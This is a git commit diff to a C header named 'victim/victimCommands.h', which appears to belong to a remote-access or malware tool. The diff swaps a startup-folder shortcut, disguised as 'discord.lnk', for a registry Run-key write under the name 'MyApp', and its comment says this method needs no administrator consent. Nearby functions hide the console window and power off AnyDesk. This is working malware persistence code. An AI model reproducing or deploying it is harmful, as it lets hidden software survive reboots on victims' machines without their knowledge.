df77aa6e4bdea21a627846e5e55ae183aa8823c5
Matan Avraham <matan03123321@gmail.com>
2021-10-04 22:17:13 +0300

    add to startup with registery

--- victim/victimCommands.h
+++ victim/victimCommands.h
@@ -271,41 +271,52 @@ void powerOffAnyDesk()
 
 void addProgramToStartup()
 {
-    /*
-    Adds the program to the windows startup folder
-    (All the programs on this folder are auto runned on every boot)
-    */
+    // /*
+    // Adds the program to the windows startup folder
+    // (All the programs on this folder are auto runned on every boot)
+    // */
 
-    //TODO: Runs the func command as administrator
+    // //TODO: Runs the func command as administrator
 
-    FILE *fp;
-    TCHAR buffer[MAX_PATH] = {0};
-    const char LINK_PATH[100] = "\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\discord.lnk\""; //TODO: check if the path changes between pc to pc
-    char command[1024] = "mklink";
+    // FILE *fp;
+    // TCHAR buffer[MAX_PATH] = {0};
+    // const char LINK_PATH[100] = "\"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\discord.lnk\""; //TODO: check if the path changes between pc to pc
+    // char command[1024] = "mklink";
 
-    // If we have already added the file to the startup programs folder
-    fp = fopen(LINK_PATH, "r");
-    if (fp)
+    // // If we have already added the file to the startup programs folder
+    // fp = fopen(LINK_PATH, "r");
+    // if (fp)
+    // {
+    //     // We will end the func
+    //     fclose(fp);
+    //     return;
+    // }
+
+    // // Adds the link path to the command (where the link file will be save)
+    // strcat(command, " ");
+    // strcat(command, LINK_PATH);
+    // strcat(command, " ");
+
+    // // Gets the path of the current file
+    // GetModuleFileName(NULL, buffer, MAX_PATH);
+
+    // // Adds the path to the target file to the command(the file which the link will open)
+    // strcat(command, "\"");   // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path
+    // strcat(command, buffer); // Adds the path
+    // strcat(command, "\"");   // Adds -> " to the end of the path
+
+    // system(command); // Executes the command
+
+    // This method not requires administrator agreement (Using registery)  (https://www.youtube.com/watch?v=r7vjqN4_Lv0)
+    char re[MAX_PATH];
+    GetModuleFileName(NULL, re, MAX_PATH);
+
+    HKEY hkey;
+    LONG key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
+    if (ERROR_SUCCESS == key)
     {
-        // We will end the func
-        fclose(fp);
-        return;
+        key = RegSetValueEx(hkey, "MyApp", 0, REG_SZ, (BYTE *)re, strlen(re));
     }
-
-    // Adds the link path to the command (where the link file will be save)
-    strcat(command, " ");
-    strcat(command, LINK_PATH);
-    strcat(command, " ");
-
-    // Gets the path of the current file
-    GetModuleFileName(NULL, buffer, MAX_PATH);
-
-    // Adds the path to the target file to the command(the file which the link will open)
-    strcat(command, "\"");   // The path looks like this -> "path" so we have to add -> " at the start and at the end of the path
-    strcat(command, buffer); // Adds the path
-    strcat(command, "\"");   // Adds -> " to the end of the path
-
-    system(command); // Executes the command
 }
 
 void hideConsoleWindow()
